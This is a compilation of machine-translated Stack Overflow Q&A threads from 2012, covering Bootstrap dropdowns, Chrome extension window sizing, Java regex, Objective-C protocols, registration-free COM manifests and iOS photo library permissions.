> 赞同：1
> 
> 时间：2012-11-26T20:01:40.337
> 
> 标签：java, android, imagemap

我想在 android 中制作一个图像映射，我发现一个[几乎有我想要的博客](http://catchthecows.com/?p=113)。

现在我已经做对了，但是我在 ImageMapTestActivity 类上有错误，它是

此行有多个标记

*   实现 com.ctc.android.widget.ImageMap.OnImageMapClickedHandler.onImageMapClicked
*   new ImageMap.OnImageMapClickedHandler(){} 类型的方法 onImageMapClicked(int) 必须覆盖超类方法

`onImageMapClicked`和方法中的这个错误`onBubbleClicked`。

# javascript - 崩溃中的引导下拉菜单在第一次尝试时未显示

> ID：13572205
> 
> 赞同：10
> 
> 时间：2012-11-26T20:01:41.023
> 
> 标签：javascript, css, twitter-bootstrap

我在导航折叠中有一个下拉菜单。

当我减小窗口的宽度（例如：700px）时，导航栏正确折叠，然后我单击 btn-navbar 以取消折叠它，然后单击下拉菜单，但它不下拉，菜单不显示。如果那时我再次折叠并取消折叠，则下拉菜单开始工作。

当窗口的宽度从一开始就很小时，也会发生同样的情况。

就像折叠部分的高度在一开始就固定了，它不会让下拉菜单做它的事情。

```
<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="content-type" content="text/html; charset=utf-8" />
        <link rel="stylesheet" type="text/css" media="screen" href="css/bootstrap.css" />
        <link rel="stylesheet" type="text/css" media="screen" href="css/bootstrap-responsive.css" />
        <script src="js/jquery.js"></script>
        <script src="js/bootstrap.js"></script>
    </head>
    <body>
        <div class="navbar">
            <div class="navbar-inner">
                <div class="container">

                    <!-- .btn-navbar is used as the toggle for collapsed navbar content -->
                    <button class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                    </button>

                    <!-- Be sure to leave the brand out there if you want it shown -->
                    <a class="brand" href="#">Project name</a>

                    <!-- Everything you want hidden at 940px or less, place within here -->
                    <div class="nav-collapse">
                        <ul class="nav pull-right">
                            <li class="dropdown">
                                <a href="#" class="dropdown-toggle" data-toggle="dropdown">
                                Anonymous <b class="caret"></b>
                                </a>
                                <ul class="dropdown-menu">
                                    <li>
                                        <a href=''><i class='icon-chevron-right'></i> Login</a>
                                    </li>
                                    <li>
                                        <a href=''><i class='icon-plus'></i> Register</a>
                                    </li>
                                </ul>
                            </li>
                        </ul>
                    </div>

                </div>
            </div>
        </div>
    </body>
</html> 
```

引导程序 v2.2.0

火狐 16.0.2

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-11-27T19:47:20.157

很多人将此报告为 repo 上的错误（例如，[问题 #5671](https://github.com/twitter/bootstrap/issues/5671)、[问题 #5890](https://github.com/twitter/bootstrap/issues/5890)、[问题 #6019](https://github.com/twitter/bootstrap/issues/6019)）。

针对#5671，有人指出，[根据响应式导航栏上的文档](http://twitter.github.com/bootstrap/components.html#navbar)，在使用该类时，`navbar-collapse`您还必须包含`collapse`. 似乎您的示例也存在同样的（尽管很容易被忽略）缺陷。

这是您的代码的一个工作示例，唯一的区别是添加`collapse`类：

## [普朗克](http://embed.plnkr.co/I6ucRV)

# java - 向网络中的用户部署基本 Java 应用程序

> ID：13572206
> 
> 赞同：-1
> 
> 时间：2012-11-26T20:01:41.383
> 
> 标签：java

我需要一些关于创建 Java 应用程序的技巧。关于应用程序的几句话：**公司的人将使用密码登录；自定义访问类型；从网络中的主机对远程数据库执行更改的可能性。**

这可能是一个非常简单的程序。一开始我不关心安全问题，可以及时优化。我只是不知道如何开始。

到目前为止，我已经玩过一些算法（我喜欢算法），将一个小程序连接到一个数据库并完成了一些选择/更新，几个摆动。

即使听起来像我可以研究的详细章节标题也可以证明是有用的，因为当我想创建一个可以在网络中分发的应用程序时，我不确定要寻找什么。

基于前文：

1.  **我需要创建什么？小程序，秋千等？它应该是一个.exe，它是如何完成的？** 感谢您的任何提示。
2.  **我听说该应用程序应该带有安装套件？在检查客户端 PC 上是否安装之后，将安装什么 - 可能是 JRE？**还有什么？

对于初学者，我应该知道的其他提示？

我不担心用户操作（选择/更新等）上下文中的算法或类名——我可以在库中找到它们。我对如何实际创建一个可以发送给整个公司的用户（方法/实践/培训）的基本应用程序感兴趣，他们可以运行并在屏幕上查看简单选择的结果，比如说。任何指针/好的参考 - 因为那里有很多网站，但并非所有网站都很好。谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-26T20:08:47.443

对于具有 GUI 和数据库交互等的桌面应用程序，您应该考虑使用富客户端框架，如[Netbeans Platform](http://netbeans.org/features/platform/)或[Eclipse RPC](http://wiki.eclipse.org/index.php/Rich_Client_Platform)。这肯定会使一些事情变得更容易，例如部署应用程序、创建安装程序或具有停靠功能的多个窗口。
顺便一提

> 起初我不关心安全问题

通常是一个非常非常糟糕的主意...

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-26T20:04:35.663

您是否尝试从 Web 链接启动应用程序？那么您正在寻找的是“JNLP”或“Java Web Start”。

[https://en.wikipedia.org/wiki/Java_Web_Start](https://en.wikipedia.org/wiki/Java_Web_Start)

作为启动的一部分，有一些方法可以设置用户权限，如有必要，它将提供和部署代码和更新。

祝你好运！

# google-chrome-extension - Chrome扩展create.window：如何使用height参数？

> ID：13572210
> 
> 赞同：1
> 
> 时间：2012-11-26T20:01:50.590
> 
> 标签：google-chrome-extension, window, height

我正在尝试使用 chrome.create.window 来获取弹出窗口，但出现了问题。

这是我的 background.js 代码：

```
chrome.extension.onRequest.addListener(function(request) {
if (request.type === 'open_window') {
        chrome.tabs.create({
            url: chrome.extension.getURL('win.html'),
            active: false
        }, function(tab) {
            chrome.windows.create({
                tabId: tab.id,
                type: 'popup',
                height: '200',

                focused: true
            });
        });
}
}); 
```

在我添加之前，`height: '200',`我得到了我想要的：一个窗口跳出浏览器。当我添加这一行时，窗口将作为打开窗口的另一个选项卡打开。为什么 ？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T21:29:58.023

使用数字而不是字符串：`200`→ `"200"`。你会知道，如果你[打开后台页面的控制台](https://stackoverflow.com/questions/10257301/where-to-read-console-messages-from-background-js-in-a-chrome-extension/10258029#10258029)：

> 未捕获的错误：参数 1 的值无效。属性“高度”：预期为“整数”，但得到“字符串”。

我建议使用`url`with 选项[`chrome.windows.create`](https://developer.chrome.com/extensions/windows.html#method-create)，因为它的效率略高：

```
chrome.windows.create({
    url: chrome.extension.getURL('win.html'),
    type: 'popup',
    height: 200,
    focused: true
}); 
```

# java - 正则表达式无法匹配

> ID：13572212
> 
> 赞同：1
> 
> 时间：2012-11-26T20:02:03.267
> 
> 标签：java, regex

我有以下字符串：

`8 0 0 . Item s Payable in Connection w ith Loan`

我正在尝试使用以下正则表达式匹配它：

`^8\\s*0\\s*0\\.`

我相信这个正则表达式的意思是：

1.  8 必须在字符串的开头
2.  8到0之间可以有任意数量的空格
3.  第一个 0 和第二个 0 之间可以有任意数量的空格
4.  最后的 0 后面必须跟一个句点。

但是在我的应用程序中，这确实与我的字符串匹配。任何一个 rpvodie 都可以帮助说明为什么它可能不匹配。我正在使用 Java。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-26T20:04:21.213

你最后`0`和你的时期之间有一个空间。您的正则表达式不允许这样做。这就是它失败的原因。

尝试

```
 "^8\\s*0\\s*0\\s*\\." 
```

# objective-c - 符合协议列表

> ID：13572213
> 
> 赞同：0
> 
> 时间：2012-11-26T20:02:06.967
> 
> 标签：objective-c, objective-c-protocol

我有一个条件，我希望视图控制器符合 4 个协议中的任何一个。

有没有办法检查它是否符合这 4 个协议中的任何一个，而无需在我的 if 中执行一堆 or 语句？

你能制作一系列协议吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-26T20:09:16.413

当然，您可以制作一系列协议：

```
NSArray *protocols = @[@protocol(UIApplicationDelegate),
    @protocol(UIImagePickerControllerDelegate),
    @protocol(UIScrollViewDelegate),
    @protocol(NSFileManagerDelegate)]; 
```

然后，您可以检查某些对象是否符合所有这些：

```
UIViewController *vc = ...;
for (Protocol *protocol in protocols) {
    if (![vc conformsToProtocol:protocol]) {
        NSLog(@"object doesn't conform to %@", protocol);
    }
} 
```

但是，很难想象您*为什么*要在运行时执行此操作。

也许您真正想要的是声明某些东西符合几个协议。你也可以这样做，编译器会在编译时为你检查。例如：

```
@property (nonatomic, strong) id<UIApplicationDelegate, UIImagePickerController,
    UIScrollViewDelegate, NSFileManagerDelegate> swissArmyKnife; 
```

如果你试图给这个属性赋值，但它不符合所有四种协议，编译器会发出警告。

也许您所说的是您想验证一个对象是否符合*至少*一个协议，但它不必符合所有协议。在这种情况下，您必须在运行时进行检查。但这对我来说是个糟糕的设计。

如果您想向对象发送消息，但不确定它是否能理解该消息，最好专门检查您要发送的消息，而不是检查协议一致性。

```
// This is probably not such a good idea.
if ([object conformsToProtocol:@protocol(NSFileManagerDelegate)]) {
    return [object fileManager:myFileManager shouldRemoveItemAtURL:url];
} else {
   return arc4random_uniform(2);
}

// This is probably better.
if ([object respondsToSelector:@selector(fileManager:shouldRemoveItemAtURL:)]) {
    return [object fileManager:myFileManager shouldRemoveItemAtURL:url];
} else {
   return arc4random_uniform(2);
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-26T20:08:01.633

当然。

```
id object = ...;
Protocol *protocols[] = {@protocol(Blah), @protocol(Foo), @protocol(Bar)};
for(unsigned i = 0; i < sizeof(protocols) / sizeof(Protocol *); ++i) {
   if([object conformsToProtocol:protocols[i]]) {
     //do something...
     break;
   }
} 
```

# com - 免费注册 COM、线程模型、MT.exe 和 *.RGS 脚本

> ID：13572218
> 
> 赞同：9
> 
> 时间：2012-11-26T20:02:29.240
> 
> 标签：com, manifest, mt, rgs, registration-free-com

我有一个免注册的 C++ COM 组件，我使用 VS2010 使用 mt.exe 生成其清单。一切正常，除了我无法指定我的类使用的线程模型。我创建了一个小型 repro 项目，其生成的清单文件 ( `RGS.dll.embed.manifest`) 如下：

```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
 <file name="RGS.dll" hashalg="SHA1">
  <comClass clsid="{4EB506E0-0D9C-4281-9B61-F027376E21C3}" tlbid="{6B48D06F-A84C-4B72-A70F-F1B091789E67}"></comClass>
  <typelib tlbid="{6B48D06F-A84C-4B72-A70F-F1B091789E67}" version="1.0" helpdir="" flags="HASDISKIMAGE"></typelib>
 </file>
 <comInterfaceExternalProxyStub name="IRgsObject1" iid="{4620CAB8-3E56-42EC-818E-8A55DF9267B7}" tlbid="{6B48D06F-A84C-4B72-A70F-F1B091789E67}" proxyStubClsid32="{00020424-0000-0000-C000-000000000046}"></comInterfaceExternalProxyStub>
</assembly> 
```

我遇到问题的部分是 comClass 节点

```
<comClass clsid="{4EB506E0-0D9C-4281-9B61-F027376E21C3}" 
          tlbid="{6B48D06F-A84C-4B72-A70F-F1B091789E67}"></comClass> 
```

应该有一个 threadingModel 属性，如以下页面的“Sxs 和注册免费 COM 激活”示例：http: [//blogs.msdn.com/b/junfeng/archive/2006/04/20/579748.aspx](http://blogs.msdn.com/b/junfeng/archive/2006/04/20/579748.aspx)

我知道线程模型未在 中指定`*.tlb`，但根据 Sen Harada 对 MSDN 文档的评论`mt.exe`，您应该能够在注册脚本文件 ( `*.rgs`) [http://msdn.microsoft.com/en-us中指定一个/library/windows/desktop/aa375649(v=vs.85).aspx](http://msdn.microsoft.com/en-us/library/windows/desktop/aa375649(v=vs.85).aspx)

所以我有`*.rgs`ATL 向导创建的文件

```
HKCR
{
    NoRemove CLSID
    {
        ForceRemove {4EB506E0-0D9C-4281-9B61-F027376E21C3} = s 'RgsObject1 Class'
        {
            ForceRemove Programmable
            InprocServer32 = s '%MODULE%'
            {
                val ThreadingModel = s 'Neutral'
            }
            TypeLib = s '{6B48D06F-A84C-4B72-A70F-F1B091789E67}'
            Version = s '1.0'
        }
    }
} 
```

所以我把`*.rgs`文件给`mt.exe`

```
C:\Program Files (x86)\Microsoft SDKs\Windows\v7.0A\bin\mt.exe /nologo /verbose /out:"Debug\RGS.dll.embed.manifest" /tlb:"Debug\RGS.tlb" /rgs:"RgsObject1.rgs" /dll:"RGS.dll" /manifest Debug\RGS.dll.intermediate.manifest 
```

并且从构建日志中看到已经成功解析了`*.rgs`文件

```
 Valid GUID!!! {4EB506E0-0D9C-4281-9B61-F027376E21C3}
     Adding entry ClsidTable[{4EB506E0-0D9C-4281-9B61-F027376E21C3}] = RgsObject1 Class
     CManGenLib.ParseFileContents::Appending class {00000000-0000-0000-0000-000000000000}

     Processed .RGS file successfully
     Found type library in file , guid {6B48D06F-A84C-4B72-A70F-F1B091789E67} (contains 2 types)
     CManGenLib.ProcessTlb::Appending class {6B48D06F-A84C-4B72-A70F-F1B091789E67}
     Found interface {4620CAB8-3E56-42EC-818E-8A55DF9267B7} 'IRgsObject1'

     Processed .TLB file successfully
     Looking for pstub {4620CAB8-3E56-42EC-818E-8A55DF9267B7} (IRgsObject1) 
```

（特别是“有效 GUID !!!”行没有`rgs:`参数 to `mt.exe`）

然而我`RGS.dll.embed.manifest`没有 threadingModel 属性。

这个人是我能在网上找到的唯一一个谈论这个问题的人，[http://social.msdn.microsoft.com/Forums/en-US/vcmfcatl/thread/dbab28cd-023f-45b1-be62-7dc71e8d3d9f](http://social.msdn.microsoft.com/Forums/en-US/vcmfcatl/thread/dbab28cd-023f-45b1-be62-7dc71e8d3d9f)，他从来没有找到了解决方案并在生成清单后对其进行了编辑。有谁知道 mt.exe 工具如何使用 RGS 文件创建清单，以及我需要做什么才能从另一端获取 threadingModel？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-27T02:13:04.423

有趣...看起来需要一些残留的 ProgId 东西才能使 mt.exe 开心。具体如下`*.rgs`

```
HKCR
{
    AtlObjectProgId.1 = s 'AtlObject Class'
    {
        CLSID = s '{2371607D-284A-4D7C-A6DD-20C15373F43F}'
    }
    NoRemove CLSID
    {
        ForceRemove {2371607D-284A-4D7C-A6DD-20C15373F43F} = s 'AtlObject Class'
        {
            InprocServer32 = s '%MODULE%'
            {
                val ThreadingModel = s 'Free'
            }
        }
    }
} 
```

产生以下`*.embed.manifest`

```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0"><file name="ATLProject2.dll" hashalg="SHA1"><comClass clsid="{2371607D-284A-4D7C-A6DD-20C15373F43F}" tlbid="{92B1424C-0D03-4909-99DC-2A70EFD210D5}" threadingModel="Free"></comClass><typelib tlbid="{92B1424C-0D03-4909-99DC-2A70EFD210D5}" version="1.0" helpdir="" flags="HASDISKIMAGE"></typelib></file><comInterfaceExternalProxyStub name="IAtlObject" iid="{81A8B3DA-2AFE-4C25-B0ED-CDD777FB01A4}" tlbid="{92B1424C-0D03-4909-99DC-2A70EFD210D5}" proxyStubClsid32="{00020424-0000-0000-C000-000000000046}"></comInterfaceExternalProxyStub></assembly> 
```

而以下`*.rgs`

```
HKCR
{
    NoRemove CLSID
    {
        ForceRemove {2371607D-284A-4D7C-A6DD-20C15373F43F} = s 'AtlObject Class'
        {
            InprocServer32 = s '%MODULE%'
            {
                val ThreadingModel = s 'Free'
            }
        }
    }
} 
```

产生以下`*.embed.manifest`

```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0"><file name="ATLProject2.dll" hashalg="SHA1"><comClass clsid="{2371607D-284A-4D7C-A6DD-20C15373F43F}" tlbid="{92B1424C-0D03-4909-99DC-2A70EFD210D5}"></comClass><typelib tlbid="{92B1424C-0D03-4909-99DC-2A70EFD210D5}" version="1.0" helpdir="" flags="HASDISKIMAGE"></typelib></file><comInterfaceExternalProxyStub name="IAtlObject" iid="{81A8B3DA-2AFE-4C25-B0ED-CDD777FB01A4}" tlbid="{92B1424C-0D03-4909-99DC-2A70EFD210D5}" proxyStubClsid32="{00020424-0000-0000-C000-000000000046}"></comInterfaceExternalProxyStub></assembly> 
```

* * *

编辑：这似乎有效，但它仅适用于`*.rgs`文件中的第一个类。例如，以下`*.rgs`

```
HKCR
{
    AtlObj1ProgId.1 = s 'AtlObj1 Class'
    {
        CLSID = s '{D15A646A-4F2F-42C2-BA8B-780AABCFB133}'
    }
    AtlObj1ProgId = s 'AtlObj1 Class'
    {       
        CurVer = s 'AtlObj1ProgId.1'
    }
    NoRemove CLSID
    {
        ForceRemove {D15A646A-4F2F-42C2-BA8B-780AABCFB133} = s 'AtlObj1 Class'
        {
            ProgID = s 'AtlObj1ProgId.1'
            VersionIndependentProgID = s 'AtlObj1ProgId'
            ForceRemove Programmable
            InprocServer32 = s '%MODULE%'
            {
                val ThreadingModel = s 'Neutral'
            }
            TypeLib = s '{85D8EC5E-3C24-4151-83D9-34CCE9A1E534}'
            Version = s '1.0'
        }
    }

    AltObj2ProgId.1 = s 'AtlObj2 Class'
    {
        CLSID = s '{C208B430-8E12-4C65-AA5A-899F6AB13C4B}'
    }
    AltObj2ProgId = s 'AtlObj2 Class'
    {       
        CurVer = s 'AltObj2ProgId.1'
    }
    NoRemove CLSID
    {
        ForceRemove {C208B430-8E12-4C65-AA5A-899F6AB13C4B} = s 'AtlObj2 Class'
        {
            ProgID = s 'AltObj2ProgId.1'
            VersionIndependentProgID = s 'AltObj2ProgId'
            ForceRemove Programmable
            InprocServer32 = s '%MODULE%'
            {
                val ThreadingModel = s 'Neutral'
            }
            TypeLib = s '{85D8EC5E-3C24-4151-83D9-34CCE9A1E534}'
            Version = s '1.0'
        }
    }
} 
```

产生以下`*.embed.manifest`

```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0"><file name="RgsClass2.dll" hashalg="SHA1"><comClass clsid="{D15A646A-4F2F-42C2-BA8B-780AABCFB133}" tlbid="{85D8EC5E-3C24-4151-83D9-34CCE9A1E534}" threadingModel="Neutral" progid="AltObj2ProgId"><progid>AtlObj1ProgId.1</progid><progid>AltObj2ProgId.1</progid></comClass><comClass clsid="{C208B430-8E12-4C65-AA5A-899F6AB13C4B}" tlbid="{85D8EC5E-3C24-4151-83D9-34CCE9A1E534}"></comClass><typelib tlbid="{85D8EC5E-3C24-4151-83D9-34CCE9A1E534}" version="1.0" helpdir="" flags="HASDISKIMAGE"></typelib></file><trustInfo xmlns="urn:schemas-microsoft-com:asm.v3"><security><requestedPrivileges><requestedExecutionLevel level="asInvoker" uiAccess="false"></requestedExecutionLevel></requestedPrivileges></security></trustInfo><comInterfaceExternalProxyStub name="IAtlObj1" iid="{FF2A4D47-DADA-451E-8125-610643B00FBC}" tlbid="{85D8EC5E-3C24-4151-83D9-34CCE9A1E534}" proxyStubClsid32="{00020424-0000-0000-C000-000000000046}"></comInterfaceExternalProxyStub><comInterfaceExternalProxyStub name="IAtlObj2" iid="{F9226919-2AB7-4DBE-9F79-092839480351}" tlbid="{85D8EC5E-3C24-4151-83D9-34CCE9A1E534}" proxyStubClsid32="{00020424-0000-0000-C000-000000000046}"></comInterfaceExternalProxyStub></assembly> 
```

请注意，只有第一个 CoClass 有一个 threadingModel（或就此而言的 ProgId）。

* * *

编辑：成功！以下`*.rgs`

```
HKCR
{
    AtlObj1ProgId.1 = s 'AtlObj1 Class'
    {
        CLSID = s '{D15A646A-4F2F-42C2-BA8B-780AABCFB133}'
    }

    NoRemove CLSID
    {
        ForceRemove {D15A646A-4F2F-42C2-BA8B-780AABCFB133} = s 'AtlObj1 Class'
        {
            ProgID = s 'AtlObj1ProgId.1'
            VersionIndependentProgID = s 'AtlObj1ProgId'
            ForceRemove Programmable
            InprocServer32 = s '%MODULE%'
            {
                val ThreadingModel = s 'Neutral'
            }
            TypeLib = s '{85D8EC5E-3C24-4151-83D9-34CCE9A1E534}'
            Version = s '1.0'
        }
    }
}

HKCR
{
    AltObj2ProgId.1 = s 'AtlObj2 Class'
    {
        CLSID = s '{C208B430-8E12-4C65-AA5A-899F6AB13C4B}'
    }

    NoRemove CLSID
    {
        ForceRemove {C208B430-8E12-4C65-AA5A-899F6AB13C4B} = s 'AtlObj2 Class'
        {
            ProgID = s 'AltObj2ProgId.1'
            VersionIndependentProgID = s 'AltObj2ProgId'
            ForceRemove Programmable
            InprocServer32 = s '%MODULE%'
            {
                val ThreadingModel = s 'Neutral'
            }
            TypeLib = s '{85D8EC5E-3C24-4151-83D9-34CCE9A1E534}'
            Version = s '1.0'
        }
    }
} 
```

产生以下`*.embed.manifest`

```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0"><file name="RgsClass2.dll" hashalg="SHA1"><comClass clsid="{D15A646A-4F2F-42C2-BA8B-780AABCFB133}" tlbid="{85D8EC5E-3C24-4151-83D9-34CCE9A1E534}" threadingModel="Neutral" progid="AtlObj1ProgId"><progid>AtlObj1ProgId.1</progid></comClass><comClass clsid="{C208B430-8E12-4C65-AA5A-899F6AB13C4B}" tlbid="{85D8EC5E-3C24-4151-83D9-34CCE9A1E534}" threadingModel="Neutral" progid="AltObj2ProgId"><progid>AltObj2ProgId.1</progid></comClass><typelib tlbid="{85D8EC5E-3C24-4151-83D9-34CCE9A1E534}" version="1.0" helpdir="" flags="HASDISKIMAGE"></typelib></file><trustInfo xmlns="urn:schemas-microsoft-com:asm.v3"><security><requestedPrivileges><requestedExecutionLevel level="asInvoker" uiAccess="false"></requestedExecutionLevel></requestedPrivileges></security></trustInfo><comInterfaceExternalProxyStub name="IAtlObj1" iid="{FF2A4D47-DADA-451E-8125-610643B00FBC}" tlbid="{85D8EC5E-3C24-4151-83D9-34CCE9A1E534}" proxyStubClsid32="{00020424-0000-0000-C000-000000000046}"></comInterfaceExternalProxyStub><comInterfaceExternalProxyStub name="IAtlObj2" iid="{F9226919-2AB7-4DBE-9F79-092839480351}" tlbid="{85D8EC5E-3C24-4151-83D9-34CCE9A1E534}" proxyStubClsid32="{00020424-0000-0000-C000-000000000046}"></comInterfaceExternalProxyStub></assembly> 
```

# objective-c - 请求访问相机胶卷的权限

> ID：13572220
> 
> 赞同：61
> 
> 时间：2012-11-26T20:02:33.687
> 
> 标签：objective-c, ios

我有一个设置视图，用户可以在其中选择打开或关闭“*导出到相机胶卷*”功能

当用户第一次打开它时（而不是在他拍摄第一张照片时），我希望应用程序询问他访问相机胶卷的权限。

我已经在许多应用程序中看到了行为，但找不到解决方法。

* * *

## 回答 #1

> 赞同：96
> 
> 时间：2012-11-26T20:24:26.200

我不确定是否有一些内置方法可以解决这个问题，但一种简单的方法是在您打开该功能时使用 ALAssetsLibrary 从照片库中提取一些无意义的信息。然后，您可以简单地取消您提取的任何信息，并且您将提示用户访问他们的照片。

例如下面的代码只是获取相机胶卷中的照片数量，但足以触发权限提示。

```
#import <AssetsLibrary/AssetsLibrary.h>

ALAssetsLibrary *lib = [[ALAssetsLibrary alloc] init];
[lib enumerateGroupsWithTypes:ALAssetsGroupSavedPhotos usingBlock:^(ALAssetsGroup *group, BOOL *stop) {
    NSLog(@"%zd", [group numberOfAssets]);
} failureBlock:^(NSError *error) {
    if (error.code == ALAssetsLibraryAccessUserDeniedError) {
        NSLog(@"user denied access, code: %zd", error.code);
    } else {
        NSLog(@"Other error code: %zd", error.code);
    }
}]; 
```

**编辑：**刚刚偶然发现这一点，下面是如何检查应用程序访问相册的授权状态。

```
ALAuthorizationStatus status = [ALAssetsLibrary authorizationStatus];

if (status != ALAuthorizationStatusAuthorized) {
    UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"Attention" message:@"Please give this app permission to access your photo library in your settings app!" delegate:nil cancelButtonTitle:@"Close" otherButtonTitles:nil, nil];
    [alert show];
} 
```

* * *

## 回答 #2

> 赞同：91
> 
> 时间：2014-10-30T14:50:39.223

[由于带有照片框架](https://developer.apple.com/library/ios/documentation/Photos/Reference/Photos_Framework/index.html)的 iOS 8使用：

**斯威夫特 3.0**：

```
PHPhotoLibrary.requestAuthorization { status in
    switch status {
    case .authorized:
        <#your code#>
    case .restricted:
        <#your code#>
    case .denied:
        <#your code#>
    default:
        // place for .notDetermined - in this callback status is already determined so should never get here
        break
    }
} 
```

**目标-C**：

```
[PHPhotoLibrary requestAuthorization:^(PHAuthorizationStatus status) {
    switch (status) {
        case PHAuthorizationStatusAuthorized:
            <#your code#>
            break;
        case PHAuthorizationStatusRestricted:
            <#your code#>
            break;
        case PHAuthorizationStatusDenied:
            <#your code#>
            break;
        default:
            break;
    }
}]; 
```

[文档](https://developer.apple.com/library/ios/documentation/Photos/Reference/PHPhotoLibrary_Class/index.html#//apple_ref/occ/clm/PHPhotoLibrary/requestAuthorization:)中的重要说明：

> 此方法总是立即返回。如果用户先前已授予或拒绝照片库访问权限，则在调用时执行处理程序块；否则，它会显示警报并仅在用户响应警报后才执行该块。

* * *

## 回答 #3

> 赞同：11
> 
> 时间：2016-07-15T14:02:05.067

从 iOS 10 开始，我们还需要在`info.plist`文件中提供照片库的使用说明，我在[那里](https://stackoverflow.com/questions/26595343/determine-if-the-access-to-photo-library-is-set-or-not-ios-8/38395022#38395022)进行了描述。然后只需使用此代码在每次我们需要时出现警报：

```
- (void)requestAuthorizationWithRedirectionToSettings {
    dispatch_async(dispatch_get_main_queue(), ^{
        PHAuthorizationStatus status = [PHPhotoLibrary authorizationStatus];
        if (status == PHAuthorizationStatusAuthorized)
        {
            //We have permission. Do whatever is needed
        }
        else
        {
            //No permission. Trying to normally request it
            [PHPhotoLibrary requestAuthorization:^(PHAuthorizationStatus status) {
                if (status != PHAuthorizationStatusAuthorized)
                {
                    //User don't give us permission. Showing alert with redirection to settings
                    //Getting description string from info.plist file
                    NSString *accessDescription = [[NSBundle mainBundle] objectForInfoDictionaryKey:@"NSPhotoLibraryUsageDescription"];
                    UIAlertController * alertController = [UIAlertController alertControllerWithTitle:accessDescription message:@"To give permissions tap on 'Change Settings' button" preferredStyle:UIAlertControllerStyleAlert];

                    UIAlertAction *cancelAction = [UIAlertAction actionWithTitle:@"Cancel" style:UIAlertActionStyleCancel handler:nil];
                    [alertController addAction:cancelAction];

                    UIAlertAction *settingsAction = [UIAlertAction actionWithTitle:@"Change Settings" style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) {
                        [[UIApplication sharedApplication] openURL:[NSURL URLWithString:UIApplicationOpenSettingsURLString]];
                    }];
                    [alertController addAction:settingsAction];

                    [[UIApplication sharedApplication].keyWindow.rootViewController presentViewController:alertController animated:YES completion:nil];
                }
            }];
        }
    });
} 
```

此外，在一些常见情况下，警报不会出现。为避免复制，我希望您看看这个[答案](https://stackoverflow.com/questions/26595343/determine-if-the-access-to-photo-library-is-set-or-not-ios-8/38395022#38395022)。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2013-01-25T16:34:30.527

用户第一次尝试在 ios 6 上写入相机胶卷时，系统会自动要求他/她获得许可。您不必添加额外的代码（在授权状态为 ALAuthorizationStatusNotDetermined 之前）。

如果用户第一次拒绝你不能再问（据我所知）。用户必须在设置->隐私->照片部分手动更改该应用程序的特定设置。

还有另一种选择，即由于其他限制（例如家长控制），用户无法授予权限，在这种情况下，状态为 ALAuthorizationStatusRestricted

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2014-12-25T10:17:11.943

迅速：

```
import AssetsLibrary

var status:ALAuthorizationStatus = ALAssetsLibrary.authorizationStatus()

if status != ALAuthorizationStatus.Authorized{
    println("User has not given authorization for the camera roll")
} 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2015-04-08T15:03:05.683

```
#import <AssetsLibrary/AssetsLibrary.h> 
```

//////

```
ALAuthorizationStatus status = [ALAssetsLibrary authorizationStatus];
    switch (status) {
        case ALAuthorizationStatusRestricted:
        {
            //Tell user access to the photos are restricted
        }

            break;
        case ALAuthorizationStatusDenied:
        {
            // Tell user access has previously been denied
        }

            break;

        case ALAuthorizationStatusNotDetermined:
        case ALAuthorizationStatusAuthorized:

            // Try to show image picker
            myPicker = [[UIImagePickerController alloc] init];
            myPicker.sourceType = UIImagePickerControllerSourceTypePhotoLibrary;
            myPicker.delegate = self;
            [self presentViewController: myPicker animated:YES completion:NULL];
            break;

        default:
            break;
    } 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2016-02-15T05:50:32.647

**iOS 9.2.1、Xcode 7.2.1、ARC 已启用**

> 'ALAuthorizationStatus' 已弃用：首先在 iOS 9.0 中弃用 - 在照片框架中改用 PHAuthorizationStatus

请参阅此帖子以获取更新的解决方案：

[确定是否设置了对照片库的访问 - PHPhotoLibrary (iOS 8)](https://stackoverflow.com/q/26595343/4018041)

**关键说明：**

*   截至今天，您很可能正在为 iOS7.0+ 进行设计，因此您需要同时处理`ALAuthorizationStatus`和`PHAuthorizationStatus`.

最简单的就是做...

```
if ([PHPhotoLibrary class])
{
   //Use the Photos framework
}
else
{
   //Use the Asset Library framework
} 
```

*   您将需要决定要用作来源的媒体集合，这取决于您的应用程序的设备。将在其上运行以及它使用的是哪个版本的操作系统。

*   如果用户拒绝授权，您可能希望将用户定向到设置。

# oracle11g - 如何在没有缓冲行的情况下将 SQLPLUS 输出保存到文本文件？

> ID：13572223
> 
> 赞同：0
> 
> 时间：2012-11-26T20:02:52.793
> 
> 标签：oracle11g, sqlplus

